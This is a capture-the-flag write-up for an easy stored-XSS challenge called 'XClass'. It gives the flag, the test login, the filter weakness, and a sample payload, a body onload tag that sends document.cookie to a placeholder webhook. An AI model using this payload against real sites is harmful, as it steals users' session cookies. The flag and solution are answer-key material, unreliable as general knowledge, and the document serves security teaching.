# 13. XClass
*Difficulty 2/5 stars (Baby-Easy)*
> Flag: cuhk24ctf{XclaSS-iS-a-SeCURe-SIte}

## Motivation
I logged in to the \*Class intranet system, and the server is rejecting my emails
with a script tag. I wonder if this is a good approach.

## Key
XClass is a simple Flask webapp with flaws as such:
- `autoescape` is set to false when displaying the messages
- Only `<script>` and `<img>` tags were filtered out in the messages

## Intended Solution
Normally to perform an XSS attack one would use `<script>` tags to run malicious javascript to 
steal the cookie, use `window.location` or `<img>` tags to force a cross-origin request and
smuggle out the cookie. But this time, `<script>` and `<img>` tags are banned.

To get around this, we can use other HTML objects to inject our payload. Some tags have
an `onload` property (or something like this) that will load javascript from a string.

Steps:
1. Login to the site with `uwustudent` and `uwuuwu`
2. Leave your payload under message
3. Feed the bot with the URL to the message under `/visit`

Sample payload:
```HTML
<body onload="location.href='<your-webhook-here>'+document.cookie"></body>
```

## Other unintended solutions
- Bypassing `img` and `script` tag filters: The regex filter should be (as far as I am concerned)
too wide of a filter. It might be possible, but since this challenge is intended to be easy
I prefer not to think about it.

## Issues
### Deployment
**Change `HOSTNAME` environment variable in `Dockerfile` in production with the actual domain.**

*Special thanks to [b6a](https://github.com/blackb6a/hkcert-ctf-2023-challenges/tree/master/14-infantxss-again/env) for
having an XSS challenge to plagarize against.*

### Pwning
*Why my payload does not work?*
- Cookie is only added to the domain defined by the `HOSTNAME` environment variable, which default is set to `localhost:24013`
for testing. So if the `HOSTNAME` is set to `localhost:24013`, browser will not send the cookie
when visiting `127.0.0.1`. Should that happens they can figure it out.
